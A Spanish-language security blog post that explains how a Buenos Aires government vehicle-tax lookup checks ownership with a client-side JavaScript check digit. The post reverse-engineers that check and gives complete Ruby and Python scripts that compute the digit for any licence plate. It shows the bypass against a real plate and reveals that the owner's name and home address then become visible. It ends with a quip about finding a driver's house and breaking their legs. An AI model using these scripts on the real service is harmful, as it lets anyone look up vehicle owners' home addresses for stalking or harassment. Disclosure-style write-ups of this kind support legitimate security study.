left;">Luego de algunas consultas a google, logre dar con un servicio de Rentas en la provincia de Buenos Aires que nos permite consultar el estado de deudas de patentes que tiene un vehículo.<br /><a href="https://www.blogger.com/goog_1561451275"><br /></a></div><div style="text-align: center;"><a href="https://lbserver02.agip.gob.ar/ConsultaPat/index.html">https://lbserver02.agip.gob.ar/ConsultaPat/index.html</a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">El mismo tiene dos formas de funcionar, si no eres el propietario solamente puedes obtener los datos correspondiente a deudas sobre el automóvil pero el sistema no te permite acceder a las secciones que identifica a la persona registrada en el Registro del Automotor como titular del vehículo.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Por otro lado, para comprobar la titularidad del vehículo, el sistema solicita ingresar un numero de verificación especial <b>único</b> que solo el dueño del automóvil debe poseer, ya que el mismo sirve para imprimir boletas de pago de deudas que incluyen los datos personales del propietario del automotor, de esta forma garantiza la privacidad de los datos de los usuarios.</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-qB9xNkqbtHs/VNQfJe_tVKI/AAAAAAAAAUM/70QsGT-fpeQ/s1600/num.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-qB9xNkqbtHs/VNQfJe_tVKI/AAAAAAAAAUM/70QsGT-fpeQ/s1600/num.png" height="366" width="640" /></a></div><div style="text-align: center;"></div><div style="text-align: left;">Lo primero que podemos analizar en el sitio, es que el dígito especial y verificador del sistema, solo acepta valores que van desde 00 a 99 (el valor no es tan único como uno cree)</div><div style="text-align: left;"><br /></div><div style="text-align: left;">En fin, la patente a estudiar en esta entrada sera <b>JMO089</b>, luego de realizar algunas pruebas manuales podemos apreciar que el captcha del sistema nunca es actualizado una vez que nos encontramos asociado a una sesión, permitiéndonos probar de forma manual las 99 combinaciones posibles hasta dar con la correcta.</div><div style="text-align: left;"></div><div style="text-align: left;"><br /></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-lCSRLVEmFNI/VNQhXub3esI/AAAAAAAAAUY/I81TL06CM9Y/s1600/Sin%2Bnombre.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-lCSRLVEmFNI/VNQhXub3esI/AAAAAAAAAUY/I81TL06CM9Y/s1600/Sin%2Bnombre.png" height="224" width="640" /></a></div><br /></div><div style="text-align: left;">En la imagen podemos apreciar que el captcha no cambia a medida que vamos probando posibles combinaciones numéricas hasta lograr dar con el correcto, por lo que da la posibilidad de programar un Brute Forcer que valla probando todos los valores posibles hasta dar con el indicado. Pero un ataque así representa un problema al tener que enfrentarnos con un captcha, cosa que no estaba dispuesto por una falta de tiempo para programar un <a href="http://webscraping.com/blog/Solving-CAPTCHA/"><b>OCR</b></a>.<br /><br />La pregunta que me formule fue:<br /><br /><b>Cual es la forma en que el sistema valida el valor correcto del dígito verificador?</b><br /><br />Lo primero que pensé es que el sistema validaba el valor del lado del servidor luego de la consulta, por lo que me puse a comprobar las peticiones que realizaba el sitio al momento de enviar el formulario. Para esto utilice <b>Live HTTP headers</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-wi2c_1oB0sk/VNQkcg_JOZI/AAAAAAAAAUk/qz6SK1EJIA8/s1600/ajax.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-wi2c_1oB0sk/VNQkcg_JOZI/AAAAAAAAAUk/qz6SK1EJIA8/s1600/ajax.png" height="355" width="640" /></a></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">Al encontrarme con esto, no podía creer lo que estaba viendo, técnicamente hablando si una validación no presenta una petición web hacia el Backend, quiere decir que la validación se esta realizado del lado del cliente osea:</div><div style="text-align: center;"><h2><b>EL SISTEMA VALIDA POR JAVASCRIPT!</b><b>&nbsp;</b><b> </b></h2></div><div style="text-align: left;">Esto implica que el algoritmo de validación del código verificador se encuentra servido en algún archivo <b>javascript</b> del lado del navegador, por lo que me puse a analizar el source html del documento para lograr identificar algún indicio de la validación. Lo primero que analice fueron los siguientes archivos:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-KjLsz9ou-FM/VNQmEVvOV2I/AAAAAAAAAUw/2AguNFy0xFk/s1600/ttt.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-KjLsz9ou-FM/VNQmEVvOV2I/AAAAAAAAAUw/2AguNFy0xFk/s1600/ttt.png" height="38" width="640" /></a></div><div style="text-align: center;"><br /><div style="text-align: left;">Dentro del archivo <b>consultaDatos.js</b> encontré la siguiente función con un nombre revelador: <b>validaDatos</b></div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-mK0b28HlMos/VNQmv5XUaQI/AAAAAAAAAU4/BX-qrWpYwEA/s1600/validator.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-mK0b28HlMos/VNQmv5XUaQI/AAAAAAAAAU4/BX-qrWpYwEA/s1600/validator.png" height="496" width="640" /></a></div><div style="text-align: left;"><div style="text-align: center;"><pre><span style="color: red;"><b>&nbsp;</b></span></pre><pre><span style="color: red;"><b>if (!check.checked &amp;&amp; patente.valido(dom1) != true)</b></span></pre></div>En la misma función se puede apreciar&nbsp; en las lineas remarcadas la estructura donde se decide el mensaje de patente valida cumpliendo los requisitos de que el <b>checkbox</b> se encuentre marcado y el resultado de la función <span style="color: red;"><b>patente.valido()</b></span> sea el necesario para resolver de forma correcta la estructura de decisión <span style="color: red;"><b>if</b><b>()</b></span>.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">El problema resulto que la función <b>patente.valido() </b>no se encontraba dentro del mismo documento, por lo que debía encontrar el fichero donde se encontraba la misma. <br /><br />Para lo que no conozcan el funcionamiento de javascript, les aclaro que los ficheros js representan un gran código estructurado dividido en distintos archivos para mejorar su organización, pero siempre que estos archivos sean incluidos en el html los mismos pueden realizar llamadas a las funciones definidas entre ellos como si todos fueran miembros de la misma clase.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Luego de buscar un poco, llegue al siguiente archivo:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-VzGAp_0Rm0M/VNQpOUC5f2I/AAAAAAAAAVE/uBs_0swkoFA/s1600/pat.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-VzGAp_0Rm0M/VNQpOUC5f2I/AAAAAAAAAVE/uBs_0swkoFA/s1600/pat.png" height="22" width="640" /></a></div><div style="text-align: center;"><br /></div></div><div style="text-align: left;">Dentro del mismo podemos obtener la estructura del código validador:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-h0CKawpkx_Q/VNQpyo9SWII/AAAAAAAAAVM/yqNczRJ7AZI/s1600/getdv.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-h0CKawpkx_Q/VNQpyo9SWII/AAAAAAAAAVM/yqNczRJ7AZI/s1600/getdv.png" height="628" width="640" /></a></div><div style="text-align: center;"><br /></div></div></div><div style="text-align: right;">Función Completa: <a href="http://pastebin.com/gYTdC9Yh">http://pastebin.com/gYTdC9Yh</a></div><div style="text-align: left;"><br />Luego de analizar detenida mente el código pude develar el comportamiento final del mismo.<br /><br />El código calcula el dígito verificador en base a la patente del vehículo, sustituyendo las letras por números especiales para formar una cadena decimal, que luego suma según su indice, pares por un lado e impares por otro, como si de un array se tratase.</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-Ie58vHIagQY/VNQrEziWUUI/AAAAAAAAAVY/pX2M3Zc9uOw/s1600/tetete.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-Ie58vHIagQY/VNQrEziWUUI/AAAAAAAAAVY/pX2M3Zc9uOw/s1600/tetete.png" height="508" width="640" /></a></div><div style="text-align: left;"><br />Luego si estos valores separados (digi1 y digi2) tienen un largo superior a un dígito (0 a 9), vuelve a sumarlos respectivamente hasta obtener 2 números de forma independiente con un largo de un dígito (0 a 9).</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Y luego los concatena para obtener el numero mágico verificador:</div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-B7iqpLnp82I/VNQr4qxNCXI/AAAAAAAAAVg/5uRIZdU7AfM/s1600/salida.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-B7iqpLnp82I/VNQr4qxNCXI/AAAAAAAAAVg/5uRIZdU7AfM/s1600/salida.png" height="38" width="320" /></a></div><div style="text-align: left;">Lo que resulta algo cómico es que esta función no tiene ninguna protección, y puede ser llamada desde la consola de desarrollo de Google Chrome o Firefox:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-ImRsGXuhKfc/VNQseJUbl1I/AAAAAAAAAVo/WpdGiwnySNE/s1600/call.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-ImRsGXuhKfc/VNQseJUbl1I/AAAAAAAAAVo/WpdGiwnySNE/s1600/call.png" height="192" width="640" /></a></div><div style="text-align: left;">Con este numero verificador podemos realizar la consulta de forma exitosa:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-rnPrnoDRUjk/VNQtCQ-CziI/AAAAAAAAAVw/9sXsescIvw8/s1600/principal.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-rnPrnoDRUjk/VNQtCQ-CziI/AAAAAAAAAVw/9sXsescIvw8/s1600/principal.png" height="180" width="640" /></a></div><div style="text-align: center;"><br /></div></div></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Al momento de solicitar una factura podemos apreciar los datos personales como el nombre del titular registrado y la dirección residencial del mismo:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-Sm6PzSW1M8U/VNQtS3TmFjI/AAAAAAAAAV4/aQ6q8AI22ok/s1600/datos.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-Sm6PzSW1M8U/VNQtS3TmFjI/AAAAAAAAAV4/aQ6q8AI22ok/s1600/datos.png" height="368" width="640" /></a></div><div style="text-align: center;"><br /></div>Realizando un poco de ingienería inversa desarrolle el siguientes scripts que permiten calcular cualquier dígito verificador solo con el numero de patente:<br /><br /><b>Ruby:</b><br /><b><br /></b><br /><pre class="brush: ruby">require 'colorize' #By hdbreaker<br /><br />class Calculate <br /><br />  def initialize()<br />   <br />    #inicializo array asociativo de clase<br />    @letrasValidas ={'A' =&gt; '14','B' =&gt; '01','C' =&gt; '00','D' =&gt; '16','E' =&gt; '05','F' =&gt; '20','G' =&gt; '19',<br />                     'H' =&gt; '09','I' =&gt; '24','J' =&gt; '07','K' =&gt; '21','L' =&gt; '08','M' =&gt; '04','N' =&gt; '13',<br />                     'O' =&gt; '25','P' =&gt; '22','Q' =&gt; '18','R' =&gt; '10','S' =&gt; '02','T' =&gt; '06','U' =&gt; '12',<br />                     'V' =&gt; '23','W' =&gt; '11','X' =&gt; '03','Y' =&gt; '15','Z' =&gt; '17',' ' =&gt; '60',};<br />  end<br /><br />  #Funcion para calcular el numero de patente<br />  def calculate(patente)<br />    patAux = patente.upcase;<br />    pares = 0;<br />    impares = 0;<br /><br />    #Bloque para sustituir las letras por los numeros correspondisntes<br />    @letrasValidas.each { |key|<br />      if(patAux.include? key[0])<br />        patAux = patAux.gsub(key[0], key[1]);<br />      end<br />    }<br /><br />    #Sumo los imares por un lado y los pares por el otro<br />    for x in (0...patAux.length)<br />      if (x % 2 == 0)<br />        pares += patAux[x].to_i;<br />      else<br />        impares += patAux[x].to_i;<br />      end<br />    end<br /><br />    #Si la sumatoria de los pares da un numero mayor a 1 digito, los sumo nuevamente hasta obtener 1 digito<br />    digi1 =pares.to_s;<br />    while (digi1.length &gt; 1)<br />      pares = 0;<br />      for x in (0...digi1.length)<br />        pares += digi1[x].to_i;<br />      end<br />      digi1 = pares.to_s;<br />    end<br /><br />    #Si la sumatoria de los impares da un numero mayor a 1 digito, los sumo nuevamente hasta obtener 1 digito<br />    digi2 =impares.to_s;<br />    while (digi2.length &gt; 1)<br />      impares = 0;<br />      for x in (0...digi2.length)<br />        impares += digi2[x].to_i;<br />      end<br />      digi2 = impares.to_s;<br />    end<br /><br />    ###############Salida en Pantalla###############<br />    puts "\n############## Rentas Ciudad de Buenos Aires ##############".green<br />    puts "URL: ".green+"https://lbserver02.agip.gob.ar/ConsultaPat/index.html".red<br />    puts "Dominio: ".green+patente.red<br />    puts "Verificador: ".green+digi1.red+""+digi2.red<br />    puts "\n"<br />  end<br />end<br /><br />if(ARGV.length==1)<br />  obj = Calculate.new()<br />  obj.calculate(ARGV[0].to_s)<br />else<br />  puts "Usage: ruby calculate.rb [patente]"<br />end<br /><br /><br /></pre><br />También dejo a continuación el script en python que armo <b>[Q]3rV[0]</b><br/><pre class="brush: py"><br />#!/usr/bin/env python<br /># -*- coding: utf-8 -*-<br /># Author : [Q]3rV[0]<br /><br />import re<br /><br />def main():<br />    pares=0<br />    impares=0<br />    letrasPatente={"A":"14", "B":"01", "C":"00", "D":"16", "E":"05", "F":"20", "G":"19", "H":"09", "I":"24", "J":"07", "K":"21", "L":"08", "M":"04", "N":"13", "O":"25", "P":"22", "Q":"18", "R":"10", "S":"02", "T":"06", "U":"12", "V":"23", "W":"11", "X":"03", "Y":"15", "Z":"17", " ":"60"}<br />    input=raw_input("Nro Patente: ")<br />    patente=input.upper()<br />    if re.match("[A-Z][A-Z][A-Z][0-9][0-9][0-9]$", patente)!=None:<br />        toInt=""<br />        for n in patente[0:3]:<br />            toInt+=letrasPatente[n]<br />        nums=toInt+patente[3:] <br />        <br />        for n in range(len(nums)):<br />            if n%2==0:<br />                pares+=int(nums[n])<br />            else:<br />                impares+=int(nums[n])<br /><br /><br />        while len(str(pares))!=1:<br />           dp=0<br />           for p in str(pares):<br />               dp+=int(p)<br />           pares=dp<br />          <br /><br />        while len(str(impares))!=1:<br />           di=0<br />           for i in str(impares):<br />               di+=int(i)<br />           impares=di<br />     <br /><br />        <br />        print "| Patente: %s | DV: %s%s |" % (patente, pares, impares)<br /><br />    else:<br />        print "[*] Error, Asegurese de que el formato de la patente es correcto. Ejemplo: GTD125"<br />       <br />if __name__ == '__main__':<br />    main()<br /><br /></pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-qYYlvHTBrt4/VNQx_GXRnNI/AAAAAAAAAWE/MbP8fPDnWQ0/s1600/jmo.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-qYYlvHTBrt4/VNQx_GXRnNI/AAAAAAAAAWE/MbP8fPDnWQ0/s1600/jmo.png" height="114" width="640" /></a></div><div style="text-align: center;"><br /></div>Espero que esta entrega sirva para concientizar sobre la seguridad de nuestros datos personales, ya que recordemos que el fallo se encuentra en una red gubernamental que expone de forma descarada los datos personales de las personas. <br /><br />Y si eres conductor... no vallas por la calle creyéndote intocable, nunca sabes con quien te puedes cruzar ni para que pueda utilizar tus datos, tal vez te encuentres con una persona que en vez de reportar el fallo utilice tu información para encontrarte, ir hacia tu casa y romperte las piernas.<br /><div style="text-align: right;"><br /><b>Saludos!</b></div><br /><br /><b><br /></b>&nbsp; <br /><br /><br /></div><div style="text-align: left;"><br /></div></div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="3">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="1">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - q3rv0 - hdbreaker -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
